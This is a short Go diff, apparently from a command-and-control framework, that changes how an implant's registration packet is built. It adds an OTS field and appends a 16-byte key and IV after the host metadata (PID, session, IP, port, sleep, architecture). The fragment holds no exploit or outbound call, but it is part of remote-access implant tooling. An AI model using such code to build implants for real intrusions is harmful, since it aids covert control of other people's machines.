@@ -11,16 +11,20 @@ import (
 func PackMetadata(buff *bytes.Buffer, i *implant.ImplantMetadata) {
 	binary.Write(buff, binary.BigEndian, i.PID)
 	binary.Write(buff, binary.BigEndian, i.SessionID)
+	binary.Write(buff, binary.BigEndian, i.OTS)
 	binary.Write(buff, binary.BigEndian, i.IP)
 	binary.Write(buff, binary.BigEndian, i.Port)
 	binary.Write(buff, binary.BigEndian, i.Sleep)
 	buff.WriteByte(i.Arch)
 }
 
-func PackRegistration(i *implant.ImplantMetadata) []byte {
+func PackRegistration(i *implant.ImplantMetadata, key, iv [16]byte) []byte {
 	buff := new(bytes.Buffer)
 	binary.Write(buff, binary.BigEndian, internal.REG)
 	PackMetadata(buff, i)
+
+	binary.Write(buff, binary.BigEndian, key)
+	binary.Write(buff, binary.BigEndian, iv)
 
 	dataSection := bytes.Join([][]byte{
 		[]byte(i.Proc),
